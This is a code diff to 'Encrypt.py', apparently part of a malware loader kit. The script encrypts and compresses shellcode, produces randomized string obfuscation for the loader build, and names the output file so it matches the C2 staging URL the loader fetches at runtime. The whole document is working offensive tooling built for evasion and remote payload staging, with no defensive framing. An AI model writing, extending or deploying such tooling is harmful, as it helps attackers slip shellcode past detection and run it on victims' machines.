@@ -3,11 +3,15 @@
 Encrypt.py - Shellcode Encryption & Build Randomizer
 
 Usage:
-  python Encrypt.py <shellcode.bin> --url https://your-server/data.enc
+  python Encrypt.py <shellcode.bin> --url https://your-server/payload.dat
+  python Encrypt.py <shellcode.bin> --url https://your-server/foo.bin --out custom.bin
 
 Generates:
-  data.enc  - LZNT1-compressed + Chaskey-CTR-encrypted shellcode (upload to C2)
-  Payload.h - Encryption params + randomized string obfuscation
+  <basename-of-url>  - LZNT1-compressed + Chaskey-CTR-encrypted shellcode.
+                       Defaults to the URL's last path component (e.g. payload.dat),
+                       so the file you upload to your C2 matches the URL the loader
+                       fetches at runtime. Override with --out if needed.
+  Payload.h          - Encryption params + randomized string obfuscation.
 """
 
 import sys
@@ -225,14 +229,36 @@ def format_initializer(name, data, items_per_line=16):
     return "\n".join(lines)
 
 
+def derive_output_filename(url: str) -> str:
+    """Return the last path component of the URL (the filename the loader will
+    GET), stripped of query/fragment. Falls back to 'payload.dat' if the URL
+    has no usable basename (e.g. https://host/ with nothing after the slash).
+    This keeps the local file produced by Encrypt.py and the file the operator
+    uploads to the C2 in sync — no manual rename required."""
+    from urllib.parse import urlparse
+    path = urlparse(url).path
+    name = path.rsplit("/", 1)[-1].strip()
+    if not name or "/" in name or "\\" in name or name in (".", ".."):
+        return "payload.dat"
+    return name
+
+
 def main():
     if len(sys.argv) < 4 or "--url" not in sys.argv:
-        print(f"Usage: {sys.argv[0]} <shellcode.bin> --url https://server/data.enc")
+        print(f"Usage: {sys.argv[0]} <shellcode.bin> --url https://server/payload.dat [--out <file>]")
         sys.exit(1)
 
     shellcode_path = sys.argv[1]
     idx = sys.argv.index("--url")
     staging_url = sys.argv[idx + 1]
+
+    # Explicit --out overrides URL-derived name. The default — URL basename —
+    # is what most operators want: encrypt → upload as-is, no rename step.
+    out_name = None
+    if "--out" in sys.argv:
+        out_name = sys.argv[sys.argv.index("--out") + 1]
+    if not out_name:
+        out_name = derive_output_filename(staging_url)
 
     with open(shellcode_path, "rb") as f:
         shellcode = f.read()
@@ -266,11 +292,12 @@ def main():
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
 
-    # Write encrypted payload
-    enc_path = os.path.join(script_dir, "data.enc")
+    # Write encrypted payload. Filename matches the URL's basename by default
+    # (or the operator's --out arg) so encrypt-then-upload is a no-rename flow.
+    enc_path = os.path.join(script_dir, out_name)
     with open(enc_path, "wb") as f:
         f.write(encrypted)
-    print(f"[+] data.enc: {len(encrypted)} bytes")
+    print(f"[+] {out_name}: {len(encrypted)} bytes")
 
     # Pick random 4-byte XOR key for string obfuscation
     xkeys = pick_xor_keys(OBFUSCATED_STRINGS)
@@ -363,7 +390,7 @@ def main():
         assert (byte_val ^ xkeys[i % 4]) == first_plain.encode('ascii')[i]
     print(f"[+] String obfuscation verified")
 
-    print(f"\n[*] Upload data.enc to: {staging_url}")
+    print(f"\n[*] Upload {out_name} to: {staging_url}")
     print(f"[*] Then build: build.bat")
 
 
